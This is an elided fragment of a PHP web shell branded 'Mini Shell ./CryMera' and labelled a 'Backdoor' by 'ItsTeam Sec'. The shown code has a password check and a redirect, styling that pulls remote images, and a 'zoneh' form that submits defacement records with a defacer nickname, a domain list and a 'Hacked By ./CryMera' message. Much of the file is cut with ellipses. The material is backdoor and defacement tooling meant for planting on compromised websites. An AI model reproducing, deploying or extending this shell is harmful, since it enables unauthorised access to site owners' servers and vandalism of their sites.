...
if($_POST['password'] == $pass) {
  ...
  echo "<script>window.location='?Its'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
...
?>
<title>-=[Mini Shell ./CryMera]=-</title>
...
<body bgcolor="black">
	<center><img src="https://g.top4top.io/p_1771gvucn0.png" style="opacity:0.5; width:300px; height:330px";></center>
	<center><h1><center><font color="white" face="Patrick Hand">-=[ Backdoor</font><font color="3BD1FC" face="Patrick Hand"> ItsTeam Sec ]=-</font><br>
</center>
...
body{
	...
	background-image: url("https://b.top4top.io/p_1641b7hkd9.jpg");
	color:White;
...
<body>
<center><font size="5" color="red" face="Patrick Hand"><h2>-=[ MINI SHELL ./CryMera ]=-</h2></font>
</center>
...
if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='ItsTeam Sec'><br>
		<u>Domains</u>: <br>
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By ./CryMera</textarea><br>
...
echo '<center><br/>./CryMera ~ Fca2k18</center>
</body>
</html>';
function perms($file){
